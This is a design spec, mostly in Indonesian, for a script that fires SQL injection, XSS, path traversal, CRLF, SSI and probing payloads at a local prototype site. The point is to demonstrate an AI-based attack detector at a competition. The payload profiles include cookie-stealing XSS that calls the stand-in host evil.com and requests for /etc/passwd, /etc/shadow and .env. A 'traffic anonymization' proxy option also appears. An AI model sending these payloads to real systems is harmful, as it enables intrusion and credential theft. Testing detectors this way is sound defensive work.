# Spec 08: Attack Simulation Tool

**Version**: 1.1
**Date**: 31 Agustus 2026
**Related PRD**: FR-8

---

## Tujuan

Menyediakan modul/skrip untuk mengirim payload serangan ke prototipe website sebagai bahan demonstrasi live saat presentasi kompetisi. Alat ini mensimulasikan attacker yang mencoba berbagai jenis serangan web.

---

## Supported Attack Types

| # | Attack Type | CSIC 2010 Class | Deskripsi |
|---|-------------|-----------------|-----------|
| 1 | SQL Injection - Classic | sql_injection | UNION-based, boolean-based blind |
| 2 | SQL Injection - Error-based | sql_injection | Trigger error messages |
| 3 | XSS - Reflected | cross_site_scripting | Script injection via URL parameter |
| 4 | XSS - Stored | cross_site_scripting | Script injection via form submission |
| 5 | Path Traversal | iis_path_traversal / linux_path_traversal | Access sensitive files |
| 6 | CRLF Injection | CRLF injection | Inject HTTP headers |
| 7 | SSI Injection | SSI injection | Server-Side Include injection |
| 8 | Buffer Overflow | buffer_overflow | Oversized input to crash service |
| 9 | Parameter Tampering | parameter manipulation discovery | Modify hidden/URL parameters |
| 10 | Directory Listing | directory listing | Enumerate server directories |
| 11 | Information Disclosure | remote_file_creation / local_file_creation | Expose sensitive information |

---

## Architecture

```
┌─────────────────────────────────────────────┐
│         attack_simulation.py                │
├─────────────────────────────────────────────┤
│  ┌───────────────────────────────────────┐  │
│  │        AttackProfileManager           │  │
│  │  (load profiles from YAML/JSON)       │  │
│  └───────────────────────────────────────┘  │
│               │                             │
│  ┌────────────┴────────────┐                │
│  ▼                        ▼                │
│  ┌─────────────┐  ┌──────────────────┐    │
│  │ Sequential  │  │ Concurrent       │    │
│  │ Mode        │  │ Mode (stress)    │    │
│  └─────────────┘  └──────────────────┘    │
│               │                             │
│               ▼                             │
│  ┌─────────────────────┐                   │
│  │     ResultsReporter  │                   │
│  │  (console + JSON)   │                   │
│  └─────────────────────┘                   │
└─────────────────────────────────────────────┘
```

---

## Attack Profiles Format

### File: `attacks/attack_profiles.yaml`

```yaml
profiles:
  sqli_classic:
    name: "SQL Injection - Classic"
    category: "sql_injection"
    severity: high
    payloads:
      - method: GET
        url: "/search"
        params:
          q: "' OR 1=1--"
      - method: GET
        url: "/products"
        params:
          id: "1 UNION SELECT username,password FROM users--"
      - method: POST
        url: "/api/login"
        body: "username=admin'--&password=anything"
      - method: POST
        url: "/api/login"
        body: "username=' UNION SELECT * FROM credentials--&password=x"

  xss_reflected:
    name: "XSS - Reflected"
    category: "cross_site_scripting"
    severity: high
    payloads:
      - method: GET
        url: "/search"
        params:
          q: "<script>alert('XSS')</script>"
      - method: GET
        url: "/profile"
        params:
          name: "<img src=x onerror=alert(document.cookie)>"
      - method: GET
        url: "/comment"
        params:
          text: "javascript:alert(1)"

  xss_stored:
    name: "XSS - Stored"
    category: "cross_site_scripting"
    severity: high
    payloads:
      - method: POST
        url: "/api/comment"
        body: '{"content": "<script>document.location=\"http://evil.com/steal?c=\"+document.cookie</script>"}'
      - method: POST
        url: "/api/profile/update"
        body: '{"bio": "<img src=x onerror=fetch(\"http://evil.com/log?d=\"+document.cookie)>"}'

  path_traversal:
    name: "Path Traversal"
    category: "path_traversal"
    severity: medium
    payloads:
      - method: GET
        url: "/files/../../../etc/passwd"
      - method: GET
        url: "/download?file=....//....//....//etc/passwd"
      - method: GET
        url: "/view?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      - method: GET
        url: "/static/..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"

  crlf_injection:
    name: "CRLF Injection"
    category: "crlf_injection"
    severity: medium
    payloads:
      - method: GET
        url: "/redirect?url=http://evil.com%0d%0aSet-Cookie:%20hacked=true"
      - method: GET
        url: "/page?name=test%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"

  ssi_injection:
    name: "SSI Injection"
    category: "ssi_injection"
    severity: medium
    payloads:
      - method: GET
        url: "/page?input=<!--#exec(cmd=\"cat /etc/passwd\")--> "
      - method: GET
        url: "/view?file=<!--#include file=\"/etc/shadow\"--> "

  buffer_overflow:
    name: "Buffer Overflow"
    category: "buffer_overflow"
    severity: critical
    payloads:
      - method: POST
        url: "/api/upload"
        body_data: "A" * 10000
      - method: POST
        url: "/api/data"
        body: '{"data": "{}"}'.replace('{}', 'A' * 5000)

  parameter_tampering:
    name: "Parameter Tampering"
    category: "parameter_manipulation"
    severity: medium
    payloads:
      - method: POST
        url: "/api/cart/update"
        body: '{"item_id": 1, "quantity": -1, "user_role": "admin"}'
      - method: POST
        url: "/api/checkout"
        body: '{"price": 0.01, "currency": "USD", "discount": 99}'
      - method: GET
        url: "/admin/users?page=1&role=user" -> modified to role=admin

  directory_listing:
    name: "Directory Listing"
    category: "directory_listing"
    severity: low
    payloads:
      - method: GET
        url: "/admin/"
      - method: GET
        url: "/backup/"
      - method: GET
        url: "/.git/config"
      - method: GET
        url: "/.env"
      - method: GET
        url: "/wp-config.php"
      - method: GET
        url: "/server-status"
      - method: GET
        url: "/phpinfo.php"

  info_disclosure:
    name: "Information Disclosure"
    category: "information_disclosure"
    severity: low
    payloads:
      - method: GET
        url: "/debug/vars"
      - method: GET
        url: "/actuator/env"
      - method: GET
        url: "/api/debug/pprof"
      - method: GET
        url: "/trace"
      - method: GET
        url: "/swagger.json"
```

---

## CLI Interface

### Usage

```bash
# Run all attacks sequentially
python attacks/run_attacks.py --target http://localhost:5000

# Run specific attack type
python attacks/run_attacks.py --target http://localhost:5000 --type sqli_classic

# Run multiple attack types
python attacks/run_attacks.py --target http://localhost:5000 --types sqli_classic xss_reflected

# Run with concurrency (stress test)
python attacks/run_attacks.py --target http://localhost:5000 --concurrent 10

# Output results as JSON
python attacks/run_attacks.py --target http://localhost:5000 --output results.json

# Verbose mode
python attacks/run_attacks.py --target http://localhost:5000 --verbose
```

### CLI Arguments

| Argument | Default | Description |
|----------|---------|-------------|
| `--target` | Required | Target URL (e.g., http://localhost:5000) |
| `--type`, `-t` | All | Attack profile name(s) to run |
| `--concurrent`, `-c` | 1 | Number of concurrent requests |
| `--output`, `-o` | console | Output file path (JSON format) |
| `--verbose`, `-v` | False | Show detailed output per request |
| `--delay`, `-d` | 0.5 | Delay between requests (seconds) |
| `--proxy` | None | Proxy URL for traffic anonymization |

---

## Implementation

### Lokasi File

```
attacks/
├── __init__.py
├── run_attacks.py              # CLI entry point
├── attack_profile_manager.py   # Load & manage attack profiles
├── attack_runner.py            # Execute attacks against target
├── result_reporter.py          # Console + JSON reporting
├── attack_profiles.yaml        # Attack definitions
└── payloads/
    ├── sqli_payloads.txt
    ├── xss_payloads.txt
    ├── traversal_payloads.txt
    └── crlf_payloads.txt
```

### Core Runner

```python
# attacks/attack_runner.py
import time
import json
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from datetime import datetime

@dataclass
class AttackResult:
    attack_name: str
    payload_index: int
    method: str
    url: str
    status_code: int
    response_time_ms: float
    detected_as: Optional[str] = None  # Label dari AI Guard
    confidence: Optional[float] = None
    blocked: bool = False
    timestamp: str = ""

class AttackRunner:
    """Execute attack payloads against target."""
    
    def __init__(self, target_url: str, verbose: bool = False):
        self.target_url = target_url.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.results: List[AttackResult] = []
    
    def execute_single(self, profile_name: str, payload: dict) -> AttackResult:
        """Execute a single attack payload."""
        start = time.time()
        
        # Build URL with params
        url = self._build_url(payload)
        
        # Make request
        try:
            if payload['method'] == 'GET':
                response = self.session.get(url, timeout=10)
            elif payload['method'] == 'POST':
                content_type = payload.get('content_type', 'application/x-www-form-urlencoded')
                response = self.session.post(
                    url,
                    data=payload.get('body', ''),
                    headers={'Content-Type': content_type},
                    timeout=10
                )
            else:
                raise ValueError(f"Unsupported method: {payload['method']}")
            
            elapsed_ms = (time.time() - start) * 1000
            
            return AttackResult(
                attack_name=profile_name,
                payload_index=0,
                method=payload['method'],
                url=url,
                status_code=response.status_code,
                response_time_ms=elapsed_ms,
                timestamp=datetime.now().isoformat()
            )
            
        except requests.Timeout:
            elapsed_ms = (time.time() - start) * 1000
            return AttackResult(
                attack_name=profile_name,
                payload_index=0,
                method=payload['method'],
                url=url,
                status_code=0,
                response_time_ms=elapsed_ms,
                timestamp=datetime.now().isoformat()
            )
    
    def execute_batch(self, profiles: Dict[str, list], concurrent: int = 1) -> List[AttackResult]:
        """Execute all attacks in a profile batch."""
        self.results = []
        
        if concurrent > 1:
            return self._execute_concurrent(profiles, concurrent)
        
        # Sequential execution
        for profile_name, payloads in profiles.items():
            print(f"\n🎯 Testing: {profile_name}")
            for i, payload in enumerate(payloads):
                result = self.execute_single(profile_name, payload)
                result.payload_index = i
                self.results.append(result)
                
                status = "✅" if result.status_code < 400 else "❌"
                print(f"  [{status}] {result.method} {result.url} -> {result.status_code} ({result.response_time_ms:.1f}ms)")
        
        return self.results
    
    def _execute_concurrent(self, profiles: Dict[str, list], max_workers: int) -> List[AttackResult]:
        """Execute attacks concurrently."""
        tasks = []
        for profile_name, payloads in profiles.items():
            for payload in payloads:
                tasks.append((profile_name, payload))
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [
                executor.submit(self.execute_single, name, payload)
                for name, payload in tasks
            ]
            
            for future in as_completed(futures):
                result = future.result()
                self.results.append(result)
        
        return self.results
    
    def _build_url(self, payload: dict) -> str:
        """Build full URL with query parameters."""
        base = f"{self.target_url}{payload['url']}"
        
        if 'params' in payload and payload['params']:
            from urllib.parse import urlencode
            params = '&'.join(f"{k}={v}" for k, v in payload['params'].items())
            separator = '&' if '?' in base else '?'
            base += f"{separator}{params}"
        
        return base
    
    def update_with_ai_detection(self, detection_results: Dict[str, dict]):
        """Update results with AI Guard classification (after checking inference API)."""
        for result in self.results:
            key = f"{result.attack_name}:{result.payload_index}"
            if key in detection_results:
                det = detection_results[key]
                result.detected_as = det.get('label')
                result.confidence = det.get('confidence')
                result.blocked = result.detected_as == 'anomalous' and det.get('action') == 'block'
    
    def get_summary(self) -> dict:
        """Generate summary statistics."""
        total = len(self.results)
        blocked = sum(1 for r in self.results if r.blocked)
        detected = sum(1 for r in self.results if r.detected_as == 'anomalous')
        
        by_category = {}
        for r in self.results:
            cat = r.attack_name
            by_category.setdefault(cat, {'total': 0, 'detected': 0, 'blocked': 0})
            by_category[cat]['total'] += 1
            if r.detected_as == 'anomalous':
                by_category[cat]['detected'] += 1
            if r.blocked:
                by_category[cat]['blocked'] += 1
        
        return {
            'total_requests': total,
            'detected_count': detected,
            'blocked_count': blocked,
            'detection_rate': round(detected / total * 100, 2) if total else 0,
            'block_rate': round(blocked / total * 100, 2) if total else 0,
            'by_category': by_category
        }
```

### Main CLI Entry Point

```python
# attacks/run_attacks.py
import argparse
import json
import sys
import yaml

from attack_profile_manager import AttackProfileManager
from attack_runner import AttackRunner
from result_reporter import ResultReporter

def main():
    parser = argparse.ArgumentParser(description='AI Guard Attack Simulation Tool')
    parser.add_argument('--target', required=True, help='Target URL (e.g., http://localhost:5000)')
    parser.add_argument('--type', '-t', nargs='+', help='Attack profile(s) to run')
    parser.add_argument('--concurrent', '-c', type=int, default=1, help='Concurrent workers')
    parser.add_argument('--output', '-o', help='Output file (JSON)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    parser.add_argument('--delay', '-d', type=float, default=0.5, help='Delay between requests')
    parser.add_argument('--config', default='attacks/attack_profiles.yaml', help='Profiles config file')
    
    args = parser.parse_args()
    
    # Load attack profiles
    manager = AttackProfileManager(args.config)
    
    if args.type:
        profiles = {name: manager.load(name) for name in args.type}
    else:
        profiles = manager.load_all()
    
    # Run attacks
    runner = AttackRunner(args.target, verbose=args.verbose)
    results = runner.execute_batch(profiles, concurrent=args.concurrent)
    
    # Generate report
    reporter = ResultReporter(verbose=args.verbose)
    summary = runner.get_summary()
    reporter.print_summary(summary)
    
    # Save results
    if args.output:
        output_data = {
            'summary': summary,
            'results': [vars(r) for r in results]
        }
        with open(args.output, 'w') as f:
            json.dump(output_data, f, indent=2)
        print(f"\n📊 Results saved to {args.output}")
    
    return 0

if __name__ == '__main__':
    sys.exit(main())
```

---

## Demo Scenario Script

Untuk kemudahan demo saat presentasi, sediakan script pre-defined:

```python
# attacks/demo_quick.py
"""Quick demo scenario for presentation."""

import subprocess
import sys

def run_demo():
    target = "http://localhost:5000"
    
    scenarios = [
        ("Normal browsing (baseline)", ["--delay", "1"]),
        ("SQL Injection attack", ["-t", "sqli_classic", "--delay", "2"]),
        ("XSS attack", ["-t", "xss_reflected", "--delay", "2"]),
        ("Mixed attacks", ["-t", "sqli_classic", "xss_reflected", "path_traversal", "--delay", "1"]),
    ]
    
    for desc, args in scenarios:
        print(f"\n{'='*50}")
        print(f"📋 Scenario: {desc}")
        print(f"{'='*50}\n")
        
        cmd = [sys.executable, "attacks/run_attacks.py", "--target", target] + args
        subprocess.run(cmd)

if __name__ == '__main__':
    run_demo()
```

---

## Acceptance Criteria

- [ ] Semua 11 jenis attack supported dan dapat direquest ke target
- [ ] CLI interface berfungsi dengan semua flag (--target, --type, --concurrent, dll.)
- [ ] Attack profiles load dari YAML tanpa code change
- [ ] Hasil tiap payload ditampilkan di console (status code, response time)
- [ ] Results exportable ke JSON
- [ ] Sequential dan concurrent mode bekerja dengan benar
- [ ] Demo quick script berhasil menjalankan serangkaian attack
- [ ] Payload aman: tidak benar-benar merusak sistem target (hanya demo lokal)
- [ ] Setiap request terekam di middleware → tercatat di dashboard
